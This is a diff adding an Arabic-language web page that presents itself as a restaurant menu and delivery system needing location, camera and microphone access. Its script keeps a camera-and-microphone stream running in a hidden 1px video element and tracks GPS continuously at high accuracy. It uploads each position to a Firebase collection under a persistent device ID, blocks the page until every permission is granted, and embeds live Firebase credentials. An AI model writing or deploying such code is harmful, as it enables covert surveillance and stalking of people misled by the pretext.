@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التتبع الجغرافي الذكي</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --primary: #3b82f6;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* شاشة الحظر ومنع العبور عند رفض الأذونات */
+        #permission-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            text-align: center;
+            transition: opacity 0.5s ease;
+        }
+
+        .overlay-card {
+            background-color: var(--card-bg);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid #334155;
+        }
+
+        .overlay-card i.lock-icon {
+            font-size: 4.5rem;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        .btn-grant {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            font-size: 1.1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 25px;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
+        }
+
+        .btn-grant:hover {
+            background-color: #2563eb;
+            transform: translateY(-2px);
+        }
+
+        /* واجهة التطبيق الرئيسية */
+        #main-app {
+            display: none;
+            width: 100%;
+            max-width: 500px;
+            padding: 20px;
+        }
+
+        .dashboard-card {
+            background-color: var(--card-bg);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            margin-bottom: 20px;
+            border: 1px solid #334155;
+        }
+
+        /* عداد الدقة التفاعلي */
+        .accuracy-badge {
+            display: inline-block;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .accuracy-high { background-color: rgba(16, 185, 129, 0.15); color: var(--success); border: 2px solid var(--success); box-shadow: 0 0 15px rgba(16, 185, 129, 0.2); }
+        .accuracy-medium { background-color: rgba(245, 158, 11, 0.15); color: var(--warning); border: 2px solid var(--warning); }
+        .accuracy-low { background-color: rgba(239, 68, 68, 0.15); color: var(--danger); border: 2px solid var(--danger); }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 15px 0;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 10px;
+        }
+        .data-row:last-child { border-bottom: none; }
+
+        .data-label { color: var(--text-muted); font-size: 0.95rem; }
+        .data-value { font-family: 'Courier New', monospace; font-size: 1rem; color: #e2e8f0; font-weight: bold; }
+
+        .status-pulse {
+            width: 12px;
+            height: 12px;
+            background-color: var(--success);
+            border-radius: 50%;
+            display: inline-block;
+            margin-left: 10px;
+            animation: pulse 1.5s infinite;
+        }
+
+        /* لإخفاء عنصر الفيديو للحفاظ على إذن الكاميرا مفتوحاً */
+        #hidden-stream {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            left: -9999px;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.5); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+        }
+    </style>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+</head>
+<body>
+
+    <video id="hidden-stream" autoplay playsinline muted></video>
+
+    <!-- شاشة طلب/حظر الأذونات -->
+    <div id="permission-overlay">
+        <div class="overlay-card">
+            <i class="fa-solid fa-triangle-exclamation lock-icon" id="status-icon" style="color: var(--warning);"></i>
+            <h2 id="overlay-title">مطلوب تفعيل صلاحيات النظام</h2>
+            <p id="overlay-desc" style="color: var(--text-muted); line-height: 1.6;">يعتمد نظام المينيو والتوصيل على تتبع الموقع بدقة، الكاميرا لقراءة الباركود، والميكروفون. يرجى منح الصلاحيات للاستمرار.</p>
+            <button class="btn-grant" id="btn-request" onclick="initiateSystemPermissions()">
+                <i class="fa-solid fa-shield-halved"></i> تفعيل الصلاحيات الآن
+            </button>
+        </div>
+    </div>
+
+    <!-- لوحة التحكم الرئيسية -->
+    <div id="main-app">
+        <div class="dashboard-card" style="text-align: center;">
+            <h2 style="margin: 0; font-size: 1.5rem;"><span class="status-pulse"></span>مراقبة الموقع اللحظي</h2>
+            <p style="color: var(--text-muted); margin: 5px 0 0 0;">المزامنة الحية مع قاعدة البيانات جارية</p>
+            
+            <div style="margin-top: 20px;">
+                <div class="data-label">دقة القراءة الجغرافية الحالية:</div>
+                <div id="accuracy-counter" class="accuracy-badge accuracy-low">
+                    <i class="fa-solid fa-satellite-dish"></i> جاري البحث عن الأقمار الصناعية...
+                </div>
+            </div>
+        </div>
+
+        <div class="dashboard-card">
+            <h3 style="margin: 0 0 15px 0; color: var(--primary); display: flex; align-items: center; gap: 10px;">
+                <i class="fa-solid fa-location-crosshairs"></i> بيانات الجهاز (loc)
+            </h3>
+            
+            <div class="data-row">
+                <span class="data-label">خط العرض (Lat):</span>
+                <span class="data-value" id="val-lat">0.000000</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">خط الطول (Lng):</span>
+                <span class="data-value" id="val-lng">0.000000</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">معرّف الجهاز (Device ID):</span>
+                <span class="data-value" id="val-device" style="font-size: 0.85rem; color: var(--warning);">-</span>
+            </div>
+            <div class="data-row">
+                <span class="data-label">آخر مزامنة للسيرفر:</span>
+                <span class="data-value" id="val-time" style="color: var(--success);">-</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 1. إعداد قاعدة بيانات Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyCEEqEALOCaQo5oSoR8A_Jh9eSpHS8Sz5o",
+            authDomain: "game1-bb93e.firebaseapp.com",
+            databaseURL: "https://game1-bb93e-default-rtdb.firebaseio.com",
+            projectId: "game1-bb93e",
+            storageBucket: "game1-bb93e.firebasestorage.app",
+            messagingSenderId: "268851425259",
+            appId: "1:268851425259:web:0074f52657190d7347b3ae"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // 2. توليد معرف ثابت للجهاز ليتم تحديث نفس الصف في قاعدة البيانات دائماً
+        let deviceId = localStorage.getItem('smart_menu_device_id');
+        if (!deviceId) {
+            deviceId = "dev_" + Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
+            localStorage.setItem('smart_menu_device_id', deviceId);
+        }
+        document.getElementById('val-device').innerText = deviceId;
+
+        let locationWatcher = null;
+        let bestAccuracy = Infinity; // لتتبع أفضل دقة تم الوصول إليها
+        let isOptimizing = true; // حالة تحسين الدقة عند البداية
+
+        // 3. دالة طلب الأذونات (الموقع، الكاميرا، الصوت)
+        async function initiateSystemPermissions() {
+            const btn = document.getElementById('btn-request');
+            btn.innerText = "جاري الفحص والاتصال بالأقمار الصناعية...";
+            btn.disabled = true;
+
+            try {
+                // طلب الكاميرا والميكروفون معاً (نستخدم الكاميرا الخلفية)
+                const mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { ideal: "environment" } }, 
+                    audio: true 
+                });
+                
+                // تثبيت البث في عنصر الفيديو المخفي ليبقى الإذن فعالاً في الخلفية
+                document.getElementById('hidden-stream').srcObject = mediaStream;
+
+                // فحص الموقع الجغرافي
+                if ("geolocation" in navigator) {
+                    startHighAccuracyTracking();
+                } else {
+                    throw new Error("الجهاز لا يدعم نظام تحديد المواقع GPS");
+                }
+
+            } catch (error) {
+                console.error("تم رفض الصلاحيات أو حدث خطأ: ", error);
+                showBlockScreen();
+            }
+        }
+
+        // 4. آلية التتبع اللحظي فائق الدقة
+        function startHighAccuracyTracking() {
+            const geoOptions = {
+                enableHighAccuracy: true, // إجبار استخدام الـ GPS الفعلي
+                timeout: 10000,           
+                maximumAge: 0             // منع استخدام المواقع المخزنة مؤقتاً (الكاش)
+            };
+
+            // watchPosition يستمر بالعمل ويتم تحديث القيمة كلما تحرك الجهاز
+            locationWatcher = navigator.geolocation.watchPosition(
+                handleLocationUpdate, 
+                handleGeoError, 
+                geoOptions
+            );
+        }
+
+        // 5. معالجة قراءات الموقع وتحسين الدقة
+        function handleLocationUpdate(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // آلية تحسين الدقة: نأخذ أفضل قراءة من بين أول عدة قراءات
+            if (isOptimizing) {
+                if (accuracy < bestAccuracy) {
+                    bestAccuracy = accuracy;
+                    saveToFirestore(lat, lng, accuracy);
+                }
+                
+                // إذا وصلنا لدقة ممتازة أو مرت 10 ثواني، نوقف وضع التحسين ونعتمد التحديث اللحظي المباشر
+                if (accuracy <= 5 || (Date.now() - startTime > 10000)) {
+                    isOptimizing = false;
+                }
+            } else {
+                // بعد التحسين، يتم التحديث اللحظي المباشر مع كل حركة
+                saveToFirestore(lat, lng, accuracy);
+            }
+
+            updateUI(lat, lng, accuracy);
+        }
+
+        let startTime = Date.now(); // لحساب مدة محاولة تحسين الدقة
+
+        // 6. تحديث واجهة المستخدم والعداد التفاعلي
+        function updateUI(lat, lng, accuracy) {
+            document.getElementById('val-lat').innerText = lat.toFixed(6);
+            document.getElementById('val-lng').innerText = lng.toFixed(6);
+            
+            const accCounter = document.getElementById('accuracy-counter');
+            accCounter.className = "accuracy-badge";
+
+            if (accuracy <= 5) {
+                // الأخضر: دقة ممتازة جداً (3-5 أمتار)
+                accCounter.classList.add('accuracy-high');
+                accCounter.innerHTML = `<i class="fa-solid fa-circle-check"></i> دقة ممتازة جداً: ${accuracy.toFixed(1)} متر`;
+            } else if (accuracy > 5 && accuracy <= 15) {
+                // البرتقالي: دقة متوسطة
+                accCounter.classList.add('accuracy-medium');
+                accCounter.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> دقة متوسطة: ${accuracy.toFixed(1)} متر`;
+            } else {
+                // الأحمر: إشارة ضعيفة
+                accCounter.classList.add('accuracy-low');
+                accCounter.innerHTML = `<i class="fa-solid fa-satellite-dish"></i> دقة ضعيفة: ${accuracy.toFixed(1)} متر`;
+            }
+
+            // إخفاء شاشة الأذونات وإظهار لوحة التحكم
+            document.getElementById('permission-overlay').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
+        }
+
+        // 7. حفظ/mzadne البيانات في Firebase في جدول (loc)
+        function saveToFirestore(lat, lng, accuracy) {
+            db.collection('loc').doc(deviceId).set({
+                latitude: lat,
+                longitude: lng,
+                accuracy: accuracy,
+                device_id: deviceId,
+                last_updated: firebase.firestore.FieldValue.serverTimestamp()
+            }, { merge: true }) // merge: true لتحديث الحقول فقط دون مسح بقية البيانات إذا وجدت
+            .then(() => {
+                const now = new Date();
+                document.getElementById('val-time').innerText = now.toLocaleTimeString('ar-IQ');
+            })
+            .catch((err) => {
+                console.error("خطأ في مزامنة Firebase: ", err);
+            });
+        }
+
+        // 8. معالجة أخطاء الـ GPS
+        function handleGeoError(error) {
+            console.warn("خطأ في مستشعر الموقع: ", error.message);
+            if (error.code === error.PERMISSION_DENIED) {
+                showBlockScreen();
+            }
+        }
+
+        // 9. شاشة الحظر التفاعلية
+        function showBlockScreen() {
+            document.getElementById('main-app').style.display = 'none';
+            const overlay = document.getElementById('permission-overlay');
+            overlay.style.display = 'flex';
+            
+            const icon = document.getElementById('status-icon');
+            icon.className = "fa-solid fa-ban lock-icon";
+            icon.style.color = "var(--danger)";
+            
+            document.getElementById('overlay-title').innerText = "تم حظر الدخول!";
+            document.getElementById('overlay-desc').innerText = "لا يمكنك استخدام النظام دون منح كافة الصلاحيات (الموقع، الكاميرا، الصوت). يرجى تحديث الصفحة والسماح بالأذونات بشكل دائم.";
+            
+            const btn = document.getElementById('btn-request');
+            btn.innerText = "إعادة المحاولة";
+            btn.disabled = false;
+        }
+
+        // 10. فحص تلقائي عند فتح الصفحة (إذا كان المستخدم قد أعطى الأذونات مسبقاً)
+        window.onload = function() {
+            if (navigator.permissions && navigator.permissions.query) {
+                // فحص إذن الموقع
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    if (result.state === 'granted') {
+                        initiateSystemPermissions();
+                    }
+                });
+                
+                // فحص إذن الكاميرا (للتنبيه فقط، الكاميرا تطلب تفاعل مستخدم غالباً)
+                navigator.permissions.query({ name: 'camera' }).then(function(result) {
+                    if (result.state === 'granted') {
+                        console.log("إذن الكاميرا مفعّل مسبقاً");
+                    }
+                });
+            }
+        };
+    </script>
+</body>
+</html>
